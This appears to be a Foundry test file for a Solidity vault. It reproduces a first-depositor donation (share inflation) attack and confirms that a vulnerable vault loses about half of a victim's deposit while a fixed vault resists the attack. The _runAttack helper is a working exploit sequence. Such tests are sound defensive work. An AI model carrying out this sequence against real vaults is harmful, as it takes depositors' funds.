// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockToken} from "../src/MockToken.sol";
import {IERC20Like} from "../src/IERC20Like.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";
import {SafeVault} from "../src/SafeVault.sol";

/// @dev Both vaults share this API, so one helper can attack either of them.
interface IVault {
    function deposit(uint256 assets) external returns (uint256);
    function sharesOf(address account) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

contract DonationAttackTest is Test {
    uint256 internal constant DONATION = 1e18;
    uint256 internal constant VICTIM_DEPOSIT = 2e18 - 1;

    MockToken internal token;
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        token = new MockToken();
    }

    /// @dev Attack steps: (1) attacker deposits 1 wei, (2) attacker donates tokens directly
    ///      to the vault, (3) victim deposits. Returns what each side's shares are worth.
    function _runAttack(IVault vault, uint256 donation, uint256 victimDeposit)
        internal
        returns (uint256 attackerSpent, uint256 attackerValue, uint256 victimValue)
    {
        token.mint(attacker, donation + 1);
        token.mint(victim, victimDeposit);

        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        token.transfer(address(vault), donation);
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        // A revert here (ZeroShares) means the victim is protected, so we ignore it.
        try vault.deposit(victimDeposit) {} catch {}
        vm.stopPrank();

        attackerSpent = donation + 1;
        attackerValue = vault.convertToAssets(vault.sharesOf(attacker));
        victimValue = vault.convertToAssets(vault.sharesOf(victim));
    }

    /// @notice The exploit: the attacker spends ~1 token and gains ~0.5 token from the victim.
    function test_vulnerableVault_attackerProfitsFromVictim() public {
        VulnerableVault vault = new VulnerableVault(IERC20Like(address(token)));
        (uint256 spent, uint256 attackerValue, uint256 victimValue) =
            _runAttack(IVault(address(vault)), DONATION, VICTIM_DEPOSIT);

        assertEq(vault.sharesOf(victim), 1, "victim should receive only 1 share");
        assertGt(attackerValue, spent, "attacker should profit");
        assertLt(victimValue, VICTIM_DEPOSIT, "victim should lose money");
        assertGt(VICTIM_DEPOSIT - victimValue, 0.49e18, "victim should lose about half");
    }

    /// @notice The fix: same attack, but now the attacker loses money.
    function test_safeVault_attackFails() public {
        SafeVault vault = new SafeVault(IERC20Like(address(token)));
        (uint256 spent, uint256 attackerValue, uint256 victimValue) =
            _runAttack(IVault(address(vault)), DONATION, VICTIM_DEPOSIT);

        assertLt(attackerValue, spent, "attacker should lose money");
        assertLt((VICTIM_DEPOSIT - victimValue) * 1000, VICTIM_DEPOSIT, "victim should lose less than 0.1%");
    }

    /// @notice For any donation and any victim deposit, the attacker never ends up ahead.
    function testFuzz_safeVault_attackerNeverProfits(uint256 donation, uint256 victimDeposit) public {
        donation = bound(donation, 1, 1e30);
        victimDeposit = bound(victimDeposit, 1, 1e30);

        SafeVault vault = new SafeVault(IERC20Like(address(token)));
        (uint256 spent, uint256 attackerValue,) = _runAttack(IVault(address(vault)), donation, victimDeposit);

        assertLe(attackerValue, spent);
    }
}
